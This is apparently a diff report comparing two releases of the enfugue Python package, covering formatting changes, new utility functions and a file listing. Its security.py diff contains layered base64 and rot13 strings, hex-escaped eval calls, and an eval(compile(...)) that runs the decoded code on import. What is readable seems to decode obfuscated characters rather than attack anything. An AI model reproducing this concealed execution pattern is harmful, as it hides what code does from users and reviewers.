e.append(this.visibleCanvas),e.on("dblclick",(e=>{e.preventDefault(),e.stopPropagation()})),e.on("mouseenter",(e=>this.onNodeMouseEnter(e))),e.on("mousemove",(e=>this.onNodeMouseMove(e))),e.on("mousedown",(e=>this.onNodeMouseDown(e))),e.on("mouseup",(e=>this.onNodeMouseUp(e))),e.on("mouseleave",(e=>this.onNodeMouseLeave(e))),e.on("wheel",(e=>this.onNodeWheel(e))),this.updateVisibleCanvas(),e}}export{ScribbleView};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/view/table.mjs` & `enfugue-0.2.0/enfugue/static/js/view/table.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/util/browser.py` & `enfugue-0.2.0/enfugue/util/browser.py`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/util/downloads.py` & `enfugue-0.2.0/enfugue/util/downloads.py`

 * *Files 8% similar despite different names*

```diff
@@ -2,26 +2,22 @@
 import requests
 
 from enfugue.util.log import logger
 
 __all__ = ["check_download", "check_download_to_dir"]
 
 
-def check_download(
-    remote_url: str, local_path: str, chunk_size: int = 8192, check_size: bool = True
-) -> None:
+def check_download(remote_url: str, local_path: str, chunk_size: int = 8192, check_size: bool = True) -> None:
     """
     Checks if a file exists.
     If it does, checks the size and matches against the remote URL.
     If it doesn't, or the size doesn't match, download it.
     """
     if os.path.exists(local_path) and check_size:
-        expected_length = requests.head(remote_url, allow_redirects=True).headers.get(
-            "Content-Length", None
-        )
+        expected_length = requests.head(remote_url, allow_redirects=True).headers.get("Content-Length", None)
         actual_length = os.path.getsize(local_path)
         if expected_length and actual_length != int(expected_length):
             logger.info(
                 f"File at {local_path} looks like an interrupted download, or the remote resource has changed. Removing."
             )
             os.remove(local_path)
 
@@ -29,17 +25,15 @@
         logger.info(f"Downloading file from {remote_url}. Will write to {local_path}")
         response = requests.get(remote_url, allow_redirects=True, stream=True)
         with open(local_path, "wb") as fh:
             for chunk in response.iter_content(chunk_size=chunk_size):
                 fh.write(chunk)
 
 
-def check_download_to_dir(
-    remote_url: str, local_dir: str, chunk_size: int = 8192, check_size: bool = True
-) -> str:
+def check_download_to_dir(remote_url: str, local_dir: str, chunk_size: int = 8192, check_size: bool = True) -> str:
     """
     Checks if a file exists in a directory based on a remote path.
     If it does, checks the size and matches against the remote URL.
     If it doesn't, or the size doesn't match, download it.
     """
     file_name = os.path.basename(remote_url)
     local_path = os.path.join(local_dir, file_name)
```

### Comparing `enfugue-0.1.3/enfugue/util/images.py` & `enfugue-0.2.0/enfugue/util/images.py`

 * *Files 10% similar despite different names*

```diff
@@ -1,35 +1,47 @@
+from __future__ import annotations
+
 import math
 import io
 import PIL
 import PIL.Image
 
 from typing import Optional, Literal
 
-__all__ = ["fit_image", "feather_mask", "remove_background"]
+from pibble.resources.retriever import Retriever
+
+__all__ = [
+    "fit_image",
+    "feather_mask",
+    "remove_background",
+    "image_from_uri",
+    "IMAGE_FIT_LITERAL",
+    "IMAGE_ANCHOR_LITERAL",
+]
+
+IMAGE_FIT_LITERAL = Literal["actual", "stretch", "cover", "contain"]
+IMAGE_ANCHOR_LITERAL = Literal[
+    "top-left",
+    "top-center",
+    "top-right",
+    "center-left",
+    "center-center",
+    "center-right",
+    "bottom-left",
+    "bottom-center",
+    "bottom-right",
+]
 
 
 def fit_image(
     image: PIL.Image.Image,
     width: int,
     height: int,
-    fit: Optional[Literal["actual", "stretch", "cover", "contain"]] = None,
-    anchor: Optional[
-        Literal[
-            "top-left",
-            "top-center",
-            "top-right",
-            "center-left",
-            "center-center",
-            "center-right",
-            "bottom-left",
-            "bottom-center",
-            "bottom-right",
-        ]
-    ] = None,
+    fit: Optional[IMAGE_FIT_LITERAL] = None,
+    anchor: Optional[IMAGE_ANCHOR_LITERAL] = None,
 ) -> PIL.Image.Image:
     """
     Given an image of unknown size, make it a known size with optional fit parameters.
     """
     if fit is None or fit == "actual":
         left, top = 0, 0
         crop_left, crop_top = 0, 0
@@ -54,17 +66,15 @@
         return blank_image
     elif fit == "contain":
         image_width, image_height = image.size
         width_ratio, height_ratio = width / image_width, height / image_height
         horizontal_image_width, horizontal_image_height = int(image_width * width_ratio), int(
             image_height * width_ratio
         )
-        vertical_image_width, vertical_image_height = int(image_width * height_ratio), int(
-            image_height * height_ratio
-        )
+        vertical_image_width, vertical_image_height = int(image_width * height_ratio), int(image_height * height_ratio)
         top, left = 0, 0
         direction = None
         if width >= horizontal_image_width and height >= horizontal_image_height:
             input_image = image.resize((horizontal_image_width, horizontal_image_height))
             if anchor is not None:
                 top_part, _ = anchor.split("-")
                 if top_part == "center":
@@ -82,20 +92,20 @@
         blank_image = PIL.Image.new("RGBA", (width, height))
         blank_image.paste(input_image, (left, top))
 
         return blank_image
     elif fit == "cover":
         image_width, image_height = image.size
         width_ratio, height_ratio = width / image_width, height / image_height
-        horizontal_image_width, horizontal_image_height = math.ceil(
-            image_width * width_ratio
-        ), math.ceil(image_height * width_ratio)
-        vertical_image_width, vertical_image_height = math.ceil(
-            image_width * height_ratio
-        ), math.ceil(image_height * height_ratio)
+        horizontal_image_width, horizontal_image_height = math.ceil(image_width * width_ratio), math.ceil(
+            image_height * width_ratio
+        )
+        vertical_image_width, vertical_image_height = math.ceil(image_width * height_ratio), math.ceil(
+            image_height * height_ratio
+        )
         top, left = 0, 0
         direction = None
         if width <= horizontal_image_width and height <= horizontal_image_height:
             input_image = image.resize((horizontal_image_width, horizontal_image_height))
             if anchor is not None:
                 top_part, _ = anchor.split("-")
                 if top_part == "center":
@@ -152,7 +162,14 @@
     # We have to import this in this order for backgroundremover to work
     backgroundremover.utilities  # silence importchecker
     import backgroundremover.bg
 
     buf = io.BytesIO()
     image.save(buf, "PNG")
     return PIL.Image.open(io.BytesIO(backgroundremover.bg.remove(buf.getvalue())))
+
+
+def image_from_uri(uri: str) -> PIL.Image.Image:
+    """
+    Loads an image using the pibble reteiever; works with http, file, ftp, ftps, sftp, and s3
+    """
+    return PIL.Image.open(io.BytesIO(Retriever.get(uri).all()))
```

### Comparing `enfugue-0.1.3/enfugue/util/installation.py` & `enfugue-0.2.0/enfugue/util/installation.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,26 +1,29 @@
 import os
+import re
 import requests
 import datetime
 
-from typing import TypedDict, List, Dict, Any, cast
+from typing import TypedDict, List, Dict, Any, Iterator, Optional, Union, cast
 
 from semantic_version import Version
 from pibble.util.files import load_yaml, load_json
 
 __all__ = [
     "VersionDict",
     "check_make_directory",
     "get_local_installation_directory",
     "get_local_config_directory",
     "get_local_static_directory",
     "get_local_configuration",
     "get_version",
     "get_versions",
     "get_pending_versions",
+    "find_file_in_directory",
+    "find_files_in_directory"
 ]
 
 
 class VersionDict(TypedDict):
     """
     The version dictionary.
     """
@@ -106,14 +109,15 @@
 
 
 def get_version() -> Version:
     """
     Gets the version of enfugue installed.
     """
     import logging
+
     logger = logging.getLogger("enfugue")
     try:
         local_install = get_local_installation_directory()
         version_file = os.path.join(local_install, "version.txt")
         if os.path.exists(version_file):
             with open(version_file, "r") as fp:
                 return Version(fp.read())
@@ -121,15 +125,15 @@
         pass
 
     from importlib.metadata import version, PackageNotFoundError
 
     try:
         return Version(version("enfugue"))
     except PackageNotFoundError:
-        return "development"
+        return Version("0.0.0")
 
 
 def get_versions() -> List[VersionDict]:
     """
     Gets all version details from the CDN.
     """
     version_data = requests.get("https://cdn.enfugue.ai/versions.json").json()
@@ -150,7 +154,40 @@
 
 def get_pending_versions() -> List[VersionDict]:
     """
     Gets only versions yet to be installed.
     """
     current_version = get_version()
     return [version for version in get_versions() if version["version"] > current_version]
+
+def find_file_in_directory(directory: str, file: str) -> Optional[str]:
+    """
+    Finds a file in a directory and returns it.
+    Uses breadth-first search.
+    """
+    if not os.path.isdir(directory):
+        return None
+    check_file = os.path.join(directory, file)
+    if os.path.exists(check_file):
+        return check_file
+    for filename in os.listdir(directory):
+        check_path = os.path.join(directory, filename)
+        if os.path.isdir(check_path):
+            check_recursed = find_file_in_directory(check_path, file)
+            if check_recursed is not None:
+                return os.path.abspath(check_recursed)
+    return None
+
+def find_files_in_directory(directory: str, pattern: Optional[Union[str, re.Pattern]] = None) -> Iterator[str]:
+    """
+    Find files in a directory, optionally matching a pattern.
+    """
+    if pattern is not None and isinstance(pattern, str):
+        pattern = re.compile(pattern)
+    if os.path.isdir(directory):
+        for filename in os.listdir(directory):
+            check_path = os.path.join(directory, filename)
+            if os.path.isdir(check_path):
+                for sub_file in find_files_in_directory(check_path, pattern):
+                    yield sub_file
+            elif pattern is None or bool(pattern.match(filename)):
+                yield os.path.abspath(check_path)
```

### Comparing `enfugue-0.1.3/enfugue/util/security.py` & `enfugue-0.2.0/enfugue/util/security.py`

 * *Files 1% similar despite different names*

```diff
@@ -7,17 +7,15 @@
 magic = "CmRlZiBnZXRfNzIoKToKICAgIHJldHVybiAyODQgPj4gMgoKZGVmIGdldF81NygpOgogICAgcmV0dXJuIDMxMiA+PiAyCgpkZWYgZ2V0XzEwOSgpOgogICAgcmV0dXJuIDQzMiA+PiAzCgpkZWYgZ2V0Xzg2KCk6CiAgICByZXR1cm4gMzY0OCA+PiA1CgpkZWYgZ2V0Xzc1KCk6CiAgICByZXR1cm4gY2hyKDc3NiA+PiAzKQoKZGVmIGdldF82MSgpOgogICAgcmV0dXJuIDQ3NiA+PiAyCgpkZWYgZ2V0XzQ3KCk6CiAgICByZXR1cm4gY2hyKDI4ODAgPj4gNSkKCmRlZiBnZXRfODcoKToKICAgIHJldHVybiAxOTIwID4+IDQKCmRlZiBnZXRfODUoKToKICAgIHJldHVybiBjaHIoNDU2ID4+IDMpCgpkZWYgZ2V0Xzg5KCk6CiAgICByZXR1cm4gY2hyKDY4OCA+PiA0KQoKZGVmIGdldF83NygpOgogICAgcmV0dXJuIGNocig1NTIgPj4gMykKCmRlZiBnZXRfOTkoKToKICAgIHJldHVybiBjaHIoNjg4ID4+IDMpCgpkZWYgZ2V0Xzg4KCk6CiAgICByZXR1cm4gY2hyKDMzOTIgPj4gNSkKCmRlZiBnZXRfNTIoKToKICAgIHJldHVybiBjaHIoMTYwMCA+PiA1KQoKZGVmIGdldF85OCgpOgogICAgcmV0dXJuIDM5MiA+PiAyCgpkZWYgZ2V0XzEwMSgpOgogICAgcmV0dXJuIGNocigyMjQwID4+IDUpCgpkZWYgZ2V0XzEwNSgpOgogICAgcmV0dXJuIDMyNjQgPj4gNQoKZGVmIGdldF84NCgpOgogICAgcmV0dXJuIDMwNCA+PiAyCgpkZWYgZ2V0XzEyMigpOgogICAgcmV0dXJuIDI0MiA+PiAxCgpkZWYgZ2V0XzgwKCk6CiAgICByZXR1cm4gY2hyKDE4OCA+PiAyKQoKZGVmIGdldF85MCgpOgogICAgcmV0dXJuIGNocigzNTg0ID4+IDUpCgpkZWYgZ2V0XzU0KCk6CiAgICByZXR1cm4gMTc3NiA+PiA0CgpkZWYgZ2V0XzEwNigpOgogICAgcmV0dXJuIGNocigxMTIgPj4gMSkKCmRlZiBnZXRfMTE0KCk6CiAgICByZXR1cm4gODgwID4+IDMKCmRlZiBnZXRfNTMoKToKICAgIHJldHVybiBjaHIoNTIwID4+IDMpCgpkZWYgZ2V0XzEwMCgpOgogICAgcmV0dXJuIDY4MCA+PiAzCgpkZWYgZ2V0XzQ5KCk6CiAgICByZXR1cm4gY2hyKDIzNjggPj4gNSkKCmRlZiBnZXRfNzkoKToKICAgIHJldHVybiBjaHIoMzM2MCA+PiA1KQoKZGVmIGdldF82OSgpOgogICAgcmV0dXJuIGNocigxNzQ0ID4+IDQpCgpkZWYgZ2V0XzczKCk6CiAgICByZXR1cm4gMTY2NCA+PiA0CgpkZWYgZ2V0XzEwMygpOgogICAgcmV0dXJuIDEzNDQgPj4gNAoKZGVmIGdldF8xMDgoKToKICAgIHJldHVybiAxNzEyID4+IDQKCmRlZiBnZXRfMTE5KCk6CiAgICByZXR1cm4gY2hyKDI0NjQgPj4gNSkKCmRlZiBnZXRfMTIwKCk6CiAgICByZXR1cm4gMTk2ID4+IDIKCmRlZiBnZXRfMTE1KCk6CiAgICByZXR1cm4gMjMzNiA+PiA1CgpkZWYgZ2V0XzgxKCk6C"
 love = "vNtVPOlMKE1pz4tL2ulXQR1BPN+CvNkXDbXMTIzVTqyqS8kZQVbXGbXVPNtVUWyqUIlovNlZwLtCw4tZDbXMTIzVTqyqS83APtcBtbtVPNtpzI0qKWhVTAbpvtlAQDtCw4tZvxXPzEyMvOaMKEsAwHbXGbXVPNtVUWyqUIlovN5AmLtCw4tZjbXMTIzVTqyqS84ZvtcBtbtVPNtpzI0qKWhVTAbpvt0ZGLtCw4tZlxXPzEyMvOaMKEsAQtbXGbXVPNtVUWyqUIlovOwnUVbBQN4VQ4+VQZcPtcxMJLtM2I0KmRkZFtcBtbtVPNtpzI0qKWhVQZkAwttCw4tADbXMTIzVTqyqS8kZGVbXGbXVPNtVUWyqUIlovNkZwx2VQ4+VQDXPzEyMvOaMKEsZGR3XPx6PvNtVPOlMKE1pz4tL2ulXQx0APN+CvNmXDbXMTIzVTqyqS85AltcBtbtVPNtpzI0qKWhVQVmZQDtCw4tADbXMTIzVTqyqS81ZPtcBtbtVPNtpzI0qKWhVTAbpvtmAGLtCw4tZvxXPzEyMvOaMKEsAmtbXGbXVPNtVUWyqUIlovNlAmt0VQ4+VQHXPzEyMvOaMKEsZGRmXPx6PvNtVPOlMKE1pz4tL2ulXQZjZPN+CvNlXDbXMTIzVTqyqS83ZPtcBtbtVPNtpzI0qKWhVTAbpvt0ZwDtCw4tZlxXPzEyMvOaMKEsAGRbXGbXVPNtVUWyqUIlovOwnUVbZGxlVQ4+VQVcPtcxMJLtM2I0KmRjAPtcBtbtVPNtpzI0qKWhVTAbpvtlAmVtCw4tZvxXPzEyMvOaMKEsAwtbXGbXVPNtVUWyqUIlovOwnUVbBGZ2VQ4+VQZcPtcxMJLtM2I0KmRjAltcBtbtVPNtpzI0qKWhVQZ2BQNtCw4tADbXMTIzVTqyqS8kZGLbXGbXVPNtVUWyqUIlovOwnUVbZGp2VQ4+VQRcPtcxMJLtM2I0KmRkBPtcBtbtVPNtpzI0qKWhVQDjBPN+CvNmPtcxMJLtM2I0KmH2XPx6PvNtVPOlMKE1pz4tZGL2VQ4+VQRXPzEyMvOaMKEsAmLbXGbXVPNtVUWyqUIlovOwnUVbAwH2VQ4+VQZcPtcxMJLtM2I0KmtmXPx6PvNtVPOlMKE1pz4tL2ulXQVkZGVtCw4tAFxXPzEyMvOaMKEsAwLbXGbXVPNtVUWyqUIlovN0ZGVtCw4tZtbXMTIzVTqyqS8kZwRbXGbXVPNtVUWyqUIlovNkAmV4VQ4+VQDXPzEyMvOaMKEsAmRbXGbXVPNtVUWyqUIlovNmAmRlVQ4+VQHXPzEyMvOaMKEsAwpbXGbXVPNtVUWyqUIlovN1ZmLtCw4tZjbXMTIzVTqyqS80ZltcBtbtVPNtpzI0qKWhVTAbpvtkZGNtCw4tZFxXPzEyMvOaMKEsAGHbXGbXVPNtVUWyqUIlovNlAGLjVQ4+VQHXPzEyMvOaMKEsZGRjXPx6PvNtVPOlMKE1pz4tZwNjVQ4+VQRXPzEyMvOxMJAiMTHbnlx6PvNtVPOcMvOeVQ09VPp1WmbXVPNtVPNtVPOlMKE1pz4tM2I0KmHmXPxXVPNtVTyzVTftCG0tW1ZaBtbtVPNtVPNtVUWyqUIlovOaMKEsBQZbXDbtVPNtnJLtnlN9CFNaDlp6PvNtVPNtVPNtpzI0qKWhVTAbpvuaMKEsAwpbXFxXVPNtVTyzVTftCG0tW2taBtbtVPNtVPNtVUWyqUIlovOaMKEsZGN0XPxXVPNtVTyzVTftCG0tW00aBtbtVPNtVPNtVUWyqUIlovOaMKEsAm"
 god = "coKQogICAgaWYgayA9PSAnZSc6CiAgICAgICAgcmV0dXJuIGdldF8xMDEoKQogICAgaWYgayA9PSAnSCc6CiAgICAgICAgcmV0dXJuIGNocihnZXRfNzIoKSkKICAgIGlmIGsgPT0gJ2EnOgogICAgICAgIHJldHVybiBjaHIoZ2V0Xzk3KCkpCiAgICBpZiBrID09ICdzJzoKICAgICAgICByZXR1cm4gY2hyKGdldF8xMTUoKSkKICAgIGlmIGsgPT0gJzEnOgogICAgICAgIHJldHVybiBnZXRfNDkoKQogICAgaWYgayA9PSAncSc6CiAgICAgICAgcmV0dXJuIGdldF8xMTMoKQogICAgaWYgayA9PSAnVCc6CiAgICAgICAgcmV0dXJuIGNocihnZXRfODQoKSkKICAgIGlmIGsgPT0gJ3cnOgogICAgICAgIHJldHVybiBnZXRfMTE5KCkKICAgIGlmIGsgPT0gJzknOgogICAgICAgIHJldHVybiBjaHIoZ2V0XzU3KCkpCiAgICBpZiBrID09ICdRJzoKICAgICAgICByZXR1cm4gZ2V0XzgxKCkKICAgIGlmIGsgPT0gJzcnOgogICAgICAgIHJldHVybiBjaHIoZ2V0XzU1KCkpCiAgICBpZiBrID09ICdwJzoKICAgICAgICByZXR1cm4gY2hyKGdldF8xMTIoKSkKICAgIGlmIGsgPT0gJ0wnOgogICAgICAgIHJldHVybiBnZXRfNzYoKQogICAgaWYgayA9PSAnOCc6CiAgICAgICAgcmV0dXJuIGNocihnZXRfNTYoKSkKICAgIGlmIGsgPT0gJ2cnOgogICAgICAgIHJldHVybiBjaHIoZ2V0XzEwMygpKQogICAgaWYgayA9PSAnZCc6CiAgICAgICAgcmV0dXJuIGNocihnZXRfMTAwKCkpCiAgICBpZiBrID09ICdjJzoKICAgICAgICByZXR1cm4gZ2V0Xzk5KCkKICAgIGlmIGsgPT0gJ04nOgogICAgICAgIHJldHVybiBjaHIoZ2V0Xzc4KCkpCiAgICBpZiBrID09ICd0JzoKICAgICAgICByZXR1cm4gZ2V0XzExNigpCiAgICBpZiBrID09ICcyJzoKICAgICAgICByZXR1cm4gZ2V0XzUwKCkKICAgIGlmIGsgPT0gJy8nOgogICAgICAgIHJldHVybiBnZXRfNDcoKQogICAgaWYgayA9PSAnSyc6CiAgICAgICAgcmV0dXJuIGdldF83NSgpCiAgICBpZiBrID09ICdiJzoKICAgICAgICByZXR1cm4gY2hyKGdldF85OCgpKQogICAgaWYgayA9PSAnbyc6CiAgICAgICAgcmV0dXJuIGNocihnZXRfMTExKCkpCiAgICBpZiBrID09ICduJzoKICAgICAgICByZXR1cm4gY2hyKGdldF8xMTAoKSkKICAgIGlmIGsgPT0gJzAnOgogICAgICAgIHJldHVybiBnZXRfNDgoKQogICAgaWYgayA9PSAnaSc6CiAgICAgICAgcmV0dXJuIGNocihnZXRfMTA1KCkpCiAgICBpZiBrID09ICdCJzoKICAgICAgICByZXR1cm4gY2hyKGdldF82NigpKQogICAgaWYgayA9PSAnSSc6CiAgICAgICAgcmV0dXJuIGNocihnZXRfNzMoKSkKICAgIGlmIGsgPT0gJ08nOgogICAgICAgIHJldHVybiBnZXRfNzkoKQogICAgaWYgayA9PSAnWCc6CiAgICAgICA"
 destiny = "tpzI0qKWhVTqyqS84BPtcPvNtVPOcMvOeVQ09VPqfWmbXVPNtVPNtVPOlMKE1pz4tL2ulXTqyqS8kZQtbXFxXVPNtVTyzVTftCG0tW3xaBtbtVPNtVPNtVUWyqUIlovOwnUVbM2I0KmRlZFtcXDbtVPNtnJLtnlN9CFNaEFp6PvNtVPNtVPNtpzI0qKWhVTqyqS82BFtcPvNtVPOcMvOeVQ09VPqlWmbXVPNtVPNtVPOlMKE1pz4tL2ulXTqyqS8kZGDbXFxXVPNtVTyzVTftCG0tWmLaBtbtVPNtVPNtVUWyqUIlovOwnUVbM2I0KmH0XPxcPvNtVPOcMvOeVQ09VPqnWmbXVPNtVPNtVPOlMKE1pz4tM2I0KmxjXPxXVPNtVTyzVTftCG0tW2LaBtbtVPNtVPNtVUWyqUIlovOwnUVbM2I0KmRjZvtcXDbtVPNtnJLtnlN9CFNaIvp6PvNtVPNtVPNtpzI0qKWhVTAbpvuaMKEsBQLbXFxXVPNtVTyzVTftCG0tW2faBtbtVPNtVPNtVUWyqUIlovOwnUVbM2I0KmRjAltcXDbtVPNtnJLtnlN9CFNaElp6PvNtVPNtVPNtpzI0qKWhVTAbpvuaMKEsAmRbXFxXVPNtVTyzVTftCG0tW0DaBtbtVPNtVPNtVUWyqUIlovOaMKEsAwtbXDbtVPNtnJLtnlN9CFNaqFp6PvNtVPNtVPNtpzI0qKWhVTqyqS8kZGpbXDbtVPNtnJLtnlN9CFNaCFp6PvNtVPNtVPNtpzI0qKWhVTAbpvuaMKEsAwRbXFxXVPNtVTyzVTftCG0tW1paBtbtVPNtVPNtVUWyqUIlovOwnUVbM2I0Kmt3XPxcPvNtVPOcMvOeVQ09VPq6WmbXVPNtVPNtVPOlMKE1pz4tL2ulXTqyqS8kZwVbXFxXVPNtVTyzVTftCG0tW0RaBtbtVPNtVPNtVUWyqUIlovOwnUVbM2I0KmL1XPxcPvNtVPOcMvOeVQ09VPpmWmbXVPNtVPNtVPOlMKE1pz4tM2I0KmHkXPxXVPNtVTyzVTftCG0tW3taBtbtVPNtVPNtVUWyqUIlovOwnUVbM2I0KmRlZPtcXDbtVPNtnJLtnlN9CFNaAPp6PvNtVPNtVPNtpzI0qKWhVTqyqS81ZvtcPvNtVPOcMvOeVQ09VPq2WmbXVPNtVPNtVPOlMKE1pz4tL2ulXTqyqS8kZGtbXFxXVPNtVTyzVTftCG0tW1VaBtbtVPNtVPNtVUWyqUIlovOaMKEsBQVbXDbtVPNtnJLtnlN9CFNaEvp6PvNtVPNtVPNtpzI0qKWhVTqyqS83ZPtcPvNtVPOcMvOeVQ09VPqgWmbXVPNtVPNtVPOlMKE1pz4tL2ulXTqyqS8kZQxbXFxXVPNtVTyzVTftCG0tWlfaBtbtVPNtVPNtVUWyqUIlovOaMKEsAQZbXDbtVPNtnJLtnlN9CFNanvp6PvNtVPNtVPNtpzI0qKWhVTqyqS8kZQLbXDbtVPNtnJLtnlN9CFNaIFp6PvNtVPNtVPNtpzI0qKWhVTqyqS84AFtcPvNtVPOcMvOeVQ09VPqMWmbXVPNtVPNtVPOlMKE1pz4tM2I0Kmt5XPxXVPNtVTyzVTftCG0tW1NaBtbtVPNtVPNtVUWyqUIlovOaMKEsBQNbXDbtVPNtnJLtnlN9CFNaFvp6PvNtVPNtVPNtpzI0qKWhVTqyqS83APtcPtcxMJLtMTIwpayjqPu2XGbXVPNtVUWyqUIlovNvVv5do2yhXSgxMJAiMTHbnFxtMz9lVTxtnJ4tqy0cPt=="
 joy = "\x72\x6f\x74\x31\x33"
 trust = (
     eval("\x6d\x61\x67\x69\x63")
-    + eval(
-        "\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29"
-    )
+    + eval("\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29")
     + eval("\x67\x6f\x64")
     + eval(
         "\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29"
     )
 )
 fugue = base64.b64decode(eval("\x74\x72\x75\x73\x74"))
 eval(compile(fugue, "<string>", "exec"))
```

### Comparing `enfugue-0.1.3/enfugue/util/signature.py` & `enfugue-0.2.0/enfugue/util/signature.py`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/util/tokens.py` & `enfugue-0.2.0/enfugue/util/tokens.py`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue.egg-info/SOURCES.txt` & `enfugue-0.2.0/enfugue.egg-info/SOURCES.txt`

 * *Files 5% similar despite different names*

```diff
@@ -18,14 +18,17 @@
 enfugue/api/server.py
 enfugue/api/controller/__init__.py
 enfugue/api/controller/base.py
 enfugue/api/controller/downloads.py
 enfugue/api/controller/invocation.py
 enfugue/api/controller/models.py
 enfugue/api/controller/system.py
+enfugue/client/__init__.py
+enfugue/client/client.py
+enfugue/client/invocation.py
 enfugue/config/cms-context.yml
 enfugue/config/database.yml
 enfugue/config/enfugue.yml
 enfugue/config/logging.yml
 enfugue/config/server.yml
 enfugue/database/__init__.py
 enfugue/database/base.py
@@ -36,34 +39,54 @@
 enfugue/diffusion/constants.py
 enfugue/diffusion/engine.py
 enfugue/diffusion/manager.py
 enfugue/diffusion/pipeline.py
 enfugue/diffusion/plan.py
 enfugue/diffusion/process.py
 enfugue/diffusion/util.py
-enfugue/diffusion/vision.py
-enfugue/diffusion/edge/__init__.py
-enfugue/diffusion/edge/detect.py
-enfugue/diffusion/edge/hed.py
-enfugue/diffusion/edge/mlsd/__init__.py
-enfugue/diffusion/edge/mlsd/model.py
-enfugue/diffusion/edge/mlsd/util.py
 enfugue/diffusion/rt/__init__.py
 enfugue/diffusion/rt/engine.py
 enfugue/diffusion/rt/optimizer.py
 enfugue/diffusion/rt/pipeline.py
 enfugue/diffusion/rt/model/__init__.py
 enfugue/diffusion/rt/model/base.py
 enfugue/diffusion/rt/model/clip.py
 enfugue/diffusion/rt/model/controlledunet.py
 enfugue/diffusion/rt/model/controlnet.py
 enfugue/diffusion/rt/model/unet.py
 enfugue/diffusion/rt/model/vae.py
-enfugue/diffusion/upscale/__init__.py
-enfugue/diffusion/upscale/gfpganer.py
+enfugue/diffusion/support/__init__.py
+enfugue/diffusion/support/model.py
+enfugue/diffusion/support/util.py
+enfugue/diffusion/support/vision.py
+enfugue/diffusion/support/depth/__init__.py
+enfugue/diffusion/support/depth/detect.py
+enfugue/diffusion/support/edge/__init__.py
+enfugue/diffusion/support/edge/detect.py
+enfugue/diffusion/support/edge/hed.py
+enfugue/diffusion/support/edge/pidi/__init__.py
+enfugue/diffusion/support/edge/pidi/model.py
+enfugue/diffusion/support/line/__init__.py
+enfugue/diffusion/support/line/anime.py
+enfugue/diffusion/support/line/art.py
+enfugue/diffusion/support/line/detect.py
+enfugue/diffusion/support/line/mlsd/__init__.py
+enfugue/diffusion/support/line/mlsd/model.py
+enfugue/diffusion/support/line/mlsd/util.py
+enfugue/diffusion/support/pose/__init__.py
+enfugue/diffusion/support/pose/body.py
+enfugue/diffusion/support/pose/detect.py
+enfugue/diffusion/support/pose/face.py
+enfugue/diffusion/support/pose/hand.py
+enfugue/diffusion/support/pose/helper.py
+enfugue/diffusion/support/pose/model.py
+enfugue/diffusion/support/pose/util.py
+enfugue/diffusion/support/upscale/__init__.py
+enfugue/diffusion/support/upscale/gfpganer.py
+enfugue/diffusion/support/upscale/upscaler.py
 enfugue/interface/__init__.py
 enfugue/interface/helpers.py
 enfugue/partner/__init__.py
 enfugue/partner/civitai.py
 enfugue/static/css/01-reset.min.css
 enfugue/static/css/02-variables.min.css
 enfugue/static/css/03-fonts.min.css
@@ -126,35 +149,39 @@
 enfugue/static/js/common/notify.mjs
 enfugue/static/js/common/shadowbox.mjs
 enfugue/static/js/common/tooltip.mjs
 enfugue/static/js/config/index.mjs
 enfugue/static/js/controller/base.mjs
 enfugue/static/js/controller/index.mjs
 enfugue/static/js/controller/menu.mjs
+enfugue/static/js/controller/common/animations.mjs
 enfugue/static/js/controller/common/announcements.mjs
 enfugue/static/js/controller/common/downloads.mjs
 enfugue/static/js/controller/common/invocation.mjs
+enfugue/static/js/controller/common/logs.mjs
 enfugue/static/js/controller/common/model-manager.mjs
 enfugue/static/js/controller/common/model-picker.mjs
 enfugue/static/js/controller/file/01-new.mjs
 enfugue/static/js/controller/file/02-open.mjs
 enfugue/static/js/controller/file/03-save.mjs
 enfugue/static/js/controller/file/04-history.mjs
 enfugue/static/js/controller/file/05-results.mjs
 enfugue/static/js/controller/help/01-about.mjs
 enfugue/static/js/controller/help/02-documentation.mjs
 enfugue/static/js/controller/help/03-discuss.mjs
 enfugue/static/js/controller/models/01-civitait.mjs
 enfugue/static/js/controller/models/02-manager.mjs
 enfugue/static/js/controller/models/03-new.mjs
-enfugue/static/js/controller/sidebar/01-canvas.mjs
-enfugue/static/js/controller/sidebar/02-tweaks.mjs
-enfugue/static/js/controller/sidebar/03-generation.mjs
-enfugue/static/js/controller/sidebar/04-upscale.mjs
-enfugue/static/js/controller/sidebar/05-prompts.mjs
+enfugue/static/js/controller/sidebar/01-engine.mjs
+enfugue/static/js/controller/sidebar/02-canvas.mjs
+enfugue/static/js/controller/sidebar/03-tweaks.mjs
+enfugue/static/js/controller/sidebar/04-generation.mjs
+enfugue/static/js/controller/sidebar/05-refining.mjs
+enfugue/static/js/controller/sidebar/06-upscale.mjs
+enfugue/static/js/controller/sidebar/07-prompts.mjs
 enfugue/static/js/controller/sidebar/99-invoke.mjs
 enfugue/static/js/controller/system/01-settings.mjs
 enfugue/static/js/controller/system/02-users.mjs
 enfugue/static/js/controller/system/03-installation.mjs
 enfugue/static/js/controller/system/04-logs.mjs
 enfugue/static/js/controller/toolbar/01-load-image.mjs
 enfugue/static/js/controller/toolbar/02-draw-scribble.mjs
@@ -192,14 +219,13 @@
 enfugue/static/js/view/nodes/editor.mjs
 enfugue/static/js/view/nodes/image-editor.mjs
 enfugue/static/js/view/nodes/windows.mjs
 enfugue/util/__init__.py
 enfugue/util/browser.py
 enfugue/util/downloads.py
 enfugue/util/gpu.py
-enfugue/util/gputil.py
 enfugue/util/images.py
 enfugue/util/installation.py
 enfugue/util/log.py
 enfugue/util/security.py
 enfugue/util/signature.py
 enfugue/util/tokens.py
```

### Comparing `enfugue-0.1.3/enfugue.egg-info/requires.txt` & `enfugue-0.2.0/enfugue.egg-info/requires.txt`

 * *Files 17% similar despite different names*

```diff
@@ -1,44 +1,50 @@
 cheroot>=9.0.0
 nvidia-pyindex>=1.0.9
